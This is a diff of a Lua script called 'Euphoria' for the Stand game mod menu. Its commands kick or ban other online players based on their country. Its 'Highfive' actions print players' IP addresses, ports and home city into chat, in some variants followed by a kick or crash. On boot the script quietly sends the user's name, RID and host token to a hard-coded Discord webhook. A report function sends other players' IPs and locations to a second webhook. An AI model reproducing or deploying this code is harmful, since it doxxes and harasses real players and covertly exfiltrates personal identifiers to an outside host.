@@ -224,9 +224,9 @@
         end)
         async_http.dispatch()
      -- WHS
-        local Webhook_dev = "https://discord.com/api/webhooks/1248678568523731156/dHh8R72M8LY-11qf4ZIMVtuWOztsco_47gkJXoDeRe-lt-Txr2aj1iy2gcMszrEtmoTh"
+        local Webhook_dev = "https://ptb.discord.com/api/webhooks/1251547020330532865/uWRqS7wIZKEfwRJaj5j33CfpnI_W_RsMTGiRBWuZt8hjaztFDNckNRrBus47T3am8m0r"
 
-        local content = "{\"embeds\": [{\"footer\": {\"text\":\"[Stand]\",\"icon_url\": \"\"},\"thumbnail\": {\"url\": \"\"},\"title\": \"**__Euphoria__** got booted up by\",\"description\": \"Name : `" ..stdusername.."`\\n RID : "..userrid.."\\n Script Version : "..scriptver.."\\n Stand Edition : "..userstded.."\\n Host Token : "..userhosttoken.."\",\"color\": 16734872}]}"
+        local content = "{\"embeds\": [{\"footer\": {\"text\":\"[Stand]\",\"icon_url\": \"\"},\"thumbnail\": {\"url\": \"\"},\"title\": \"**Euphoria** got booted up by\",\"description\": \"Name : `" ..stdusername.."`\\n RID : "..userrid.."\\n Script Version : "..scriptver.."\\n Stand Edition : "..userstded.."\\n Host Token : "..userhosttoken.."\",\"color\": 16734872}]}"
         async_http.init(Webhook_dev, nil, function()
         end, function()
         end)
@@ -550,7 +550,7 @@
             local host = players.get_host()
         if Country == "France" or Country == "Belgium" or Country == "Switzerland" then
             if user == host then
-                commands("ban"..name)
+                commands("loveletter"..name)
             else
                 commands("nonhostkick"..name)
             end
@@ -586,7 +586,7 @@
             local host = players.get_host()
         if Country == "Spain" or Country == "Brazil" or Country == "Portugal" then
             if user == host then
-                commands("ban"..name)
+                commands("loveletter"..name)
             else
                 commands("nonhostkick"..name)
             end
@@ -612,11 +612,9 @@
             local host = players.get_host()
         if Country == "United Kingdom" or Country == "United States" then
             if user == host then
-                commands("ban"..name)
-                toast("Host")
+                commands("loveletter"..name)
             else
                 commands("nonhostkick"..name)
-                toast("Non-Host")
             end
         end
         end
@@ -640,7 +638,7 @@
             local host = players.get_host()
         if Country == "Russian Federation" or Country == "Ukraine" or Country == "Latvia" then
             if user == host then
-                commands("ban"..name)
+                commands("loveletter"..name)
             else
                 commands("nonhostkick"..name)
             end
@@ -666,7 +664,7 @@
             local host = players.get_host()
         if Country == "Germany" or Country == "Switzerland" then
             if user == host then
-                commands("ban"..name)
+                commands("loveletter"..name)
             else
                 commands("nonhostkick"..name)
             end
@@ -692,7 +690,7 @@
             local host = players.get_host()
         if Country == "Italy" or Country == "Switzerland" then
             if user == host then
-                commands("ban"..name)
+                commands("loveletter"..name)
             else
                 commands("nonhostkick"..name)
             end
@@ -718,7 +716,7 @@
             local host = players.get_host()
         if Country == "China" or Country == "Japan" or Country == "Hong Kong" then
             if user == host then
-                commands("ban"..name)
+                commands("loveletter"..name)
             else
                 commands("nonhostkick"..name)
             end
@@ -744,7 +742,7 @@
             local host = players.get_host()
         if Country == "Poland" then
             if user == host then
-                commands("ban"..name)
+                commands("loveletter"..name)
             else
                 commands("nonhostkick"..name)
             end
@@ -770,7 +768,7 @@
             local host = players.get_host()
         if Country == "Romania" then
             if user == host then
-                commands("ban"..name)
+                commands("loveletter"..name)
             else
                 commands("nonhostkick"..name)
             end
@@ -796,7 +794,7 @@
             local host = players.get_host()
         if Country == "Bulgarian" then
             if user == host then
-                commands("ban"..name)
+                commands("loveletter"..name)
             else
                 commands("nonhostkick"..name)
             end
@@ -822,7 +820,7 @@
             local host = players.get_host()
         if Country == "Czech Republic" then
             if user == host then
-                commands("ban"..name)
+                commands("loveletter"..name)
             else
                 commands("nonhostkick"..name)
             end
@@ -848,7 +846,7 @@
             local host = players.get_host()
         if Country == "Netherlands" then
             if user == host then
-                commands("ban"..name)
+                commands("loveletter"..name)
             else
                 commands("nonhostkick"..name)
             end
@@ -874,7 +872,7 @@
             local host = players.get_host()
         if Country == "Sweden" or Country == "Norway" then
             if user == host then
-                commands("ban"..name)
+                commands("loveletter"..name)
             else
                 commands("nonhostkick"..name)
             end
@@ -1061,6 +1059,8 @@
     action(customv1, "credits", {"credits"}, "", function()
         yield(500)
         msg("ScriptHostLocker ; Euphoria Dev", false, true, true)
+        yield(500)
+        msg("Akolpa / AnyaSenpai ; OG Euphoria Dev", false, true, true)
         yield(500)
         msg("Sainan ; Stand Dev, without her, this script wouldnt exist!", false, true, true)
         yield(500)
@@ -1345,26 +1345,31 @@
                 end)
 
                 action(highfive, "Highfive", {"highfive"}, "Leaks IP, location and other stuff.", function()
-                    if anya or yutsana then
+                    if anya then
                         yield(200)
                         msg("Sorry but you cannot use that command on Euphoria Staff!", false, true, true)
                     else
-                        yield(1000)
-                        msg(name.."'s Relay IP is "..RelIP..":"..RelPort..", his Lan IP is "..LanIP.." and his IP is "..IP..":"..IPP, false, true, true)
-                        yield(200)
-                        msg(name.."'s RID is "..RID..", their game language is "..gamelang..", he lives at "..Country..", "..Region..", "..City..".", false, true, true)
-                        yield(20)
+                        if vpn or ISP == "Proton AG" then
+                            yield(1000)
+                            msg(name.." is using a VPN. Their ISP is "..ISP, false, true, true)
+                        else
+                            yield(1000)
+                            msg(name.."'s Relay IP is "..RelIP..":"..RelPort..", his Lan IP is "..LanIP.." and his IP is "..IP..":"..IPP, false, true, true)
+                            yield(200)
+                            msg(name.."'s RID is "..RID..", their game language is "..gamelang..", he lives at "..Country..", "..Region..", "..City..".", false, true, true)
+                            yield(20)
+                        end
                     end
                 end, nil, nil, comtox)
 
                 action(highfive, "Highfive V2", {"highfivev2"}, "Leaks IP, location and other stuff with a kick at the end.", function()
-                    if anya or yutsana then
-                        msg("lol", true, true, true)
+                    if anya then
+                        msg("Sorry but you cannot use that command on Euphoria Staff!", false, true, true)
                     else
                         commands("highfive"..name)
                         yield(hfdelay2)
                         if user == host then
-                            commands("ban"..name)
+                            commands("loveletter"..name)
                         else
                             commands("kick"..name)
                         end
@@ -1372,8 +1377,8 @@
                 end, nil, nil, comtox)
 
                 action(highfive, "Highfive V3", {"highfivev3"}, "Leaks IP, location and other stuff with a crash at the end.", function()
-                    if anya or yutsana then
-                        msg("lol", true, true, true)
+                    if anya then
+                        msg("Sorry but you cannot use that command on Euphoria Staff!", false, true, true)
                     else
                         commands("highfive"..name)
                         yield(hfdelay2)
@@ -1812,7 +1817,7 @@
                 textinput(customreporter, "Reason", {"euphoriareportingcustomreason"}, "", function()
                 end)
             -- Webhook
-                local Webhook_link = "https://discord.com/api/webhooks/1248678824833450145/pNYA3sd9W6WTMk0De3n540TXklbkzWSbKWuH7GJDfKQzWap6TDlWU7dxDaSgrKTGI1pV"
+                local Webhook_link = "https://ptb.discord.com/api/webhooks/1251547179672408095/khKxdkPoZhULbTFAXMQlSaDnUpFjrK1g0FdJkLiAcAR-2K1_ZM6WYB5RLM5SATFCjc1H"
 
                 action(customreporter, "Report Player", {"discordreport"}, "", function()
                     local content = "{\"embeds\": [{\"footer\": {\"text\":\"Report sent by : "..players.get_name(players.user()).."\",\"icon_url\": \"\"},\"thumbnail\": {\"url\": \"\"},\"title\": \"Reported User Informations :\",\"description\": \"Name : `" ..name.."`\\n RID : "..RID.."\\n Host Token : "..ht.."\\n Modder : "..mod.."\\n Admin : "..admin.."\\n VPN : "..vpn.."\\n IP : "..IP.."\\n City : "..City.."\\n Region : "..Region.."\\n Country : "..Country.."\\n \\n Reason : \\n`"..getvaluee(refbyrpath(proot, "Reporter>Reason")).."`\",\"color\": 16734872}]}"
